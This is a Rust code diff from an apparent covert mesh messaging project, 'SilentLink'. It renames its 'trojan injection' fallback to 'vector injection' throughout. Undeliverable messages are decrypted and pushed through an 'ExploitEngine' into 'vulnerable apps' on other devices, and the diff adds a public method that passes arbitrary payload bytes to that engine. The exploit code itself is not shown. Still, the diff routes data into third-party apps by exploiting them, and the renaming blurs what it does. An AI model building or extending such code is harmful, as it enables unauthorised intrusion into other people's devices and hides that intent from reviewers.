@@ -1484,8 +1484,8 @@ impl MessageRouter {
                                 }
                                 Err(e) => {
                                     warn!("⚠️ Transport escalation failed for {}: {}", recipient_id, e);
-                                    // Fall back to trojan injection
-                                    return self.attempt_trojan_delivery(&message).await;
+                                    // Fall back to vector injection
+                                    return self.attempt_vector_delivery(&message).await;
                                 }
                             }
                         } else if !neighbor_table.contains_key(recipient_id) {
@@ -1518,25 +1518,25 @@ impl MessageRouter {
         if sent_count > 0 {
             debug!("Message {} forwarded to {} devices", message.header.message_id, sent_count);
         } else {
-            warn!("Could not forward message {} - attempting trojan delivery as last resort", message.header.message_id);
-            return self.attempt_trojan_delivery(&message).await;
+            warn!("Could not forward message {} - attempting vector delivery as last resort", message.header.message_id);
+            return self.attempt_vector_delivery(&message).await;
         }
 
         Ok(())
     }
 
-    /// Attempt trojan delivery when conventional transport fails
-    async fn attempt_trojan_delivery(&self, message: &EncryptedMessage) -> Result<()> {
+    /// Attempt vector delivery when conventional transport fails
+    async fn attempt_vector_delivery(&self, message: &EncryptedMessage) -> Result<()> {
         if let Some(exploit_engine) = &self.exploit_engine {
             if let Ok(plaintext) = self.crypto_engine.decrypt_message(message).await {
-                // Create trojan payload with proper formatting for vector apps
+                // Create vector payload with proper formatting for vector apps
                 let payload_data = serde_json::json!({
                     "id": message.header.message_id.to_string(),
                     "content": plaintext.content,
                     "sender": message.header.sender_id.0.to_string(),
                     "timestamp": message.header.created_at,
                     "type": "covert_message",
-                    "delivery_method": "trojan_injection",
+                    "delivery_method": "vector_injection",
                     "priority": plaintext.metadata.get("priority").unwrap_or(&"1".to_string()).clone()
                 });
 
@@ -1555,16 +1555,16 @@ impl MessageRouter {
                             info!("Successfully injected message to {} vector apps", successful_injections);
                             return Ok(());
                         } else {
-                            warn!("All trojan injection attempts failed");
+                            warn!("All vector injection attempts failed");
                         }
                     }
                     Err(e) => {
-                        warn!("Trojan injection failed: {}", e);
+                        warn!("Vector injection failed: {}", e);
                     }
                 }
             }
         } else {
-            warn!("Trojan delivery unavailable - ExploitEngine not initialized");
+            warn!("Vector delivery unavailable - ExploitEngine not initialized");
         }
         
         Err(SilentLinkError::System("All delivery methods exhausted".to_string()))
@@ -1936,13 +1936,7 @@ impl SilentLink {
         }
 
         // Step 2: Enhanced flow - attempt discovery → escalation → vector injection
-        match self.attempt_enhanced_delivery(content.clone(), recipient_id.clone()).await {
-            Ok(message_id) => Ok(message_id),
-            Err(e) => {
-                warn!("Enhanced delivery failed: {}, falling back to trojan injection", e);
-                self.send_via_trojan(content, recipient_id).await
-            }
-        }
+        self.attempt_enhanced_delivery(content, recipient_id).await
     }
 
     /// Discovery → Escalation → Vector Injection flow
@@ -2021,21 +2015,7 @@ impl SilentLink {
         }
     }
 
-    /// Legacy trojan injection method (kept for compatibility)
-    pub async fn send_via_trojan(&self, content: String, target_device_id: Option<DeviceId>) -> Result<Uuid> {
-        info!("Attempting legacy trojan-style message delivery");
 
-        // Try direct communication first
-        if let Ok(message_id) = self.message_router
-            .send_message(content.clone(), target_device_id.clone(), MessageType::DirectMessage, None)
-            .await {
-            return Ok(message_id);
-        }
-
-        // If direct fails, use vector injection
-        warn!("Direct communication failed, attempting trojan injection");
-        self.execute_vector_injection(content, target_device_id).await
-    }
 
     /// Broadcast message to all discovered devices
     pub async fn send_broadcast(&self, content: String) -> Result<Uuid> {
@@ -2085,6 +2065,11 @@ impl SilentLink {
     /// Check if system is running
     pub async fn is_running(&self) -> bool {
         self.is_running.load(Ordering::Acquire)
+    }
+
+    /// Direct access to exploit engine for payload injection
+    pub async fn inject_payload_to_apps(&self, payload: &[u8]) -> Result<Vec<crate::exploit_engine::InjectionResult>> {
+        self.exploit_engine.inject_payload_to_apps(payload).await
     }
 
     /// Get system and platform information
@@ -2163,14 +2148,14 @@ impl SilentLink {
             message_ids.push(id);
         }
 
-        // 2. Trojan injection to all vulnerable apps
-        if let Ok(id) = self.send_via_trojan(format!("EMERGENCY: {}", message), None).await {
+        // 2. Vector injection to all vulnerable apps
+        if let Ok(id) = self.execute_vector_injection(format!("EMERGENCY: {}", message), None).await {
             message_ids.push(id);
         }
 
         // 3. Ultrasonic broadcast (emergency frequencies)
         // This would use special emergency ultrasonic frequencies
-        // that trojan apps specifically listen for
+        // that vector apps specifically listen for
         info!("Emergency ultrasonic broadcast active");
 
         if message_ids.is_empty() {
